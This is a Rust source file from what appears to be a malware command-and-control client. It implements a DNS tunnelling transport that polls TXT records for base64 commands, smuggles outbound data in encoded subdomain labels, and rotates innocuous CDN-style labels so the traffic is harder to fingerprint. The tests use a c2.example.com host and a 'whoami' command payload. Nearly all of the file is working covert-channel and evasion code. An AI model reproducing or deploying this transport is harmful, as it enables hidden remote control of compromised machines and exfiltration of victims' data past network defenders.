// DNS transport — bidirectional via TXT labels (heartbeat + command poll + data uplink).
//
// Query patterns (rotate to reduce fingerprinting):
//   <rot-label>.<agent-tag>.<domain>   — poll / heartbeat
//   d.<base32-chunk>.<agent-tag>.<domain> — uplink data fragments
//
// TXT responses:
//   "alive" / empty → no work
//   "cmd:<base64>"  → command payload for agent
//   "ok"            → ack

use crate::error::{ClientError, Result};
use crate::transport::Transport;
use async_trait::async_trait;
use log::{debug, error, info, warn};
use std::time::Duration;
use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
use trust_dns_resolver::TokioAsyncResolver;

/// Rotating benign-looking subdomain labels (CDN / analytics style).
const ROT_LABELS: &[&str] = &[
    "cdn", "static", "assets", "api", "edge", "img", "js", "css", "update", "sync",
];

pub struct DnsTransport {
    domain: String,
    client_uuid: Option<String>,
    resolver: TokioAsyncResolver,
    connected: bool,
    /// Pending command bytes from last poll (receive drains this)
    pending_rx: Vec<u8>,
    label_idx: usize,
}

impl DnsTransport {
    pub fn new(url: String) -> Self {
        let cleaned_url = url
            .trim_matches('\0')
            .trim_matches(char::from(0))
            .trim()
            .to_string();

        let mut domain = cleaned_url;
        for prefix in &["ws://", "wss://", "dns://"] {
            if domain.starts_with(prefix) {
                domain = domain.replacen(prefix, "", 1);
            }
        }
        if let Some(pos) = domain.find('/') {
            domain = domain[..pos].to_string();
        }
        // strip port for DNS name
        if let Some(pos) = domain.rfind(':') {
            if domain[pos + 1..].chars().all(|c| c.is_ascii_digit()) {
                domain = domain[..pos].to_string();
            }
        }

        debug!("DnsTransport domain={}", domain);
        let resolver = Self::create_resolver();
        Self {
            domain,
            client_uuid: None,
            resolver,
            connected: false,
            pending_rx: Vec::new(),
            label_idx: 0,
        }
    }

    fn create_resolver() -> TokioAsyncResolver {
        use std::net::SocketAddr;
        use trust_dns_resolver::config::NameServerConfig;

        let mut opts = ResolverOpts::default();
        opts.timeout = Duration::from_secs(5);
        opts.attempts = 2;

        if let Some(resolver_addr) = crate::config::get_dns_resolver() {
            if let Ok(socket_addr) = resolver_addr.parse::<SocketAddr>() {
                let mut config = ResolverConfig::new();
                config.add_name_server(NameServerConfig {
                    socket_addr,
                    protocol: trust_dns_resolver::config::Protocol::Udp,
                    tls_dns_name: None,
                    trust_negative_responses: true,
                    bind_addr: None,
                });
                return TokioAsyncResolver::tokio(config, opts);
            }
        }
        TokioAsyncResolver::tokio(ResolverConfig::google(), opts)
    }

    pub fn set_client_uuid(&mut self, uuid: String) {
        self.client_uuid = Some(uuid);
    }

    pub fn domain(&self) -> &str {
        &self.domain
    }

    /// Opaque agent tag (not raw UUID) — first 12 hex of SHA256(uuid).
    fn agent_tag(&self) -> Result<String> {
        use sha2::{Digest, Sha256};
        let uuid = self.client_uuid.as_ref().ok_or_else(|| {
            ClientError::ConnectionError("DNS UUID not set".into())
        })?;
        let h = Sha256::digest(uuid.as_bytes());
        Ok(hex::encode(&h[..6]))
    }

    fn next_label(&mut self) -> &'static str {
        let l = ROT_LABELS[self.label_idx % ROT_LABELS.len()];
        self.label_idx = self.label_idx.wrapping_add(1);
        l
    }

    /// Poll query: <rot>.<tag>.<domain>
    fn build_poll_domain(&mut self) -> Result<String> {
        let tag = self.agent_tag()?;
        let label = self.next_label();
        Ok(format!("{}.{}.{}", label, tag, self.domain))
    }

    /// Encode data as base32-ish DNS-safe labels (a-z0-9), max ~40 chars per label.
    fn encode_uplink_labels(data: &[u8]) -> Vec<String> {
        // base64url without padding, split into 40-char labels
        use base64::Engine;
        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
        let mut out = Vec::new();
        for chunk in b64.as_bytes().chunks(40) {
            out.push(String::from_utf8_lossy(chunk).to_string());
        }
        if out.is_empty() {
            out.push("0".to_string());
        }
        out
    }

    async fn query_txt(&self, domain: &str) -> Result<Vec<String>> {
        debug!("TXT lookup {}", domain);
        match self.resolver.txt_lookup(domain).await {
            Ok(response) => {
                let mut results = Vec::new();
                for record in response.iter() {
                    for data in record.iter() {
                        if let Ok(text) = String::from_utf8(data.to_vec()) {
                            results.push(text);
                        }
                    }
                }
                Ok(results)
            }
            Err(e) => {
                error!("DNS TXT failed {}: {}", domain, e);
                Err(ClientError::ConnectionError(format!("DNS query failed: {e}")))
            }
        }
    }

    /// Parse TXT into optional command payload.
    fn parse_txt_command(responses: &[String]) -> Option<Vec<u8>> {
        use base64::Engine;
        for response in responses {
            let r = response.trim();
            if r.is_empty() || r == "alive" || r == "ok" || r == "pong" {
                continue;
            }
            if let Some(rest) = r.strip_prefix("cmd:") {
                if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(rest.trim()) {
                    return Some(bytes);
                }
                if let Ok(bytes) = base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(rest.trim()) {
                    return Some(bytes);
                }
            }
            // Raw base64 command
            if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(r) {
                if !bytes.is_empty() {
                    return Some(bytes);
                }
            }
        }
        None
    }
}

#[async_trait]
impl Transport for DnsTransport {
    async fn connect(&mut self) -> Result<()> {
        info!("DNS transport connecting domain={}", self.domain);
        self.connected = true;
        Ok(())
    }

    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let tag = self.agent_tag()?;
        if data.is_empty() {
            // Heartbeat / poll uplink empty
            let q = self.build_poll_domain()?;
            let responses = self.query_txt(&q).await?;
            if let Some(cmd) = Self::parse_txt_command(&responses) {
                self.pending_rx = cmd;
            }
            return Ok(());
        }

        // Uplink: d.<chunk>.<tag>.<domain> (multiple queries if needed)
        let labels = Self::encode_uplink_labels(data);
        for (i, lab) in labels.iter().enumerate() {
            let q = format!("d{}.{}.{}", i, lab, format!("{}.{}", tag, self.domain));
            // Keep FQDN under ~200 chars
            let q = if q.len() > 200 {
                format!("d{}.{}.{}", i % 10, &lab[..lab.len().min(30)], self.domain)
            } else {
                q
            };
            let _ = self.query_txt(&q).await;
        }
        Ok(())
    }

    async fn receive(&mut self) -> Result<Vec<u8>> {
        if !self.pending_rx.is_empty() {
            return Ok(std::mem::take(&mut self.pending_rx));
        }
        let q = self.build_poll_domain()?;
        let responses = self.query_txt(&q).await?;
        if let Some(cmd) = Self::parse_txt_command(&responses) {
            return Ok(cmd);
        }
        Ok(Vec::new())
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    fn initialize(&mut self, client_uuid: &str) {
        self.set_client_uuid(client_uuid.to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_transport_creation() {
        let transport = DnsTransport::new("dns://c2.example.com".to_string());
        assert_eq!(transport.domain(), "c2.example.com");
        assert!(!transport.is_connected());
    }

    #[test]
    fn test_dns_transport_url_cleaning() {
        let transport = DnsTransport::new("dns://c2.example.com\0\0".to_string());
        assert_eq!(transport.domain(), "c2.example.com");
    }

    #[test]
    fn agent_tag_not_raw_uuid() {
        let mut t = DnsTransport::new("dns://c2.example.com".to_string());
        t.set_client_uuid("550e8400-e29b-41d4-a716-446655440000".into());
        let tag = t.agent_tag().unwrap();
        assert_eq!(tag.len(), 12);
        assert!(!tag.contains("550e8400"));
    }

    #[test]
    fn parse_cmd_txt() {
        use base64::Engine;
        let payload = b"{\"cmd\":\"whoami\"}";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
        let r = vec![format!("cmd:{}", b64)];
        let out = DnsTransport::parse_txt_command(&r).unwrap();
        assert_eq!(out, payload);
    }

    #[test]
    fn encode_uplink_splits() {
        let labels = DnsTransport::encode_uplink_labels(&[0u8; 100]);
        assert!(!labels.is_empty());
        assert!(labels.iter().all(|l| l.len() <= 40));
    }
}
